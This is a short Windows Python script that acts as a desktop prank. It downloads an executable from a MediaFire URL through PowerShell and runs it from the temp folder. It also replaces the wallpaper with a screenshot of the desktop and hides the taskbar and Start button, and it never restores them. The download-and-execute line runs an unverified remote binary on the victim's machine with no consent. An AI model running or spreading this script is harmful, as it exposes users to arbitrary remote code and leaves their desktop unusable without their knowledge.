import pyautogui
from tempfile import gettempdir
import os
import ctypes
from ctypes import wintypes
import sys

temp = gettempdir()
os.system(f'powershell.exe -Command "Invoke-WebRequest "https://download1509.mediafire.com/6tgcgzkxrshg/6xw0ylhu9vunfcg/HideDesktopIcons.exe" -OutFile "$env:Temp\HideIcons.exe""')
pyautogui.screenshot(f'{temp}\\desktop.png')


image_path = f'{temp}\\desktop.png'
SPI_SETDESKWALLPAPER  = 0x0014
SPIF_UPDATEINIFILE    = 0x0001
SPIF_SENDWININICHANGE = 0x0002

user32 = ctypes.WinDLL('user32')
SystemParametersInfo = user32.SystemParametersInfoW
SystemParametersInfo.argtypes = ctypes.c_uint,ctypes.c_uint,ctypes.c_void_p,ctypes.c_uint
SystemParametersInfo.restype = wintypes.BOOL
print(SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE))


os.startfile(f'{temp}\\HideIcons.exe')


user32 = ctypes.WinDLL("user32")

SW_HIDE = 0
SW_SHOW = 5

HIDE = True;


def hide_taskbar():
    hWnd = user32.FindWindowW(u"Shell_traywnd", None)
    user32.ShowWindow(hWnd, SW_HIDE)

    hWnd_btn_start = user32.FindWindowW(u"Button", 'Start')
    user32.ShowWindow(hWnd_btn_start, SW_HIDE)

def unhide_taskbar():
    hWnd = user32.FindWindowW(u"Shell_traywnd", None)
    user32.ShowWindow(hWnd, SW_SHOW)

hide_taskbar()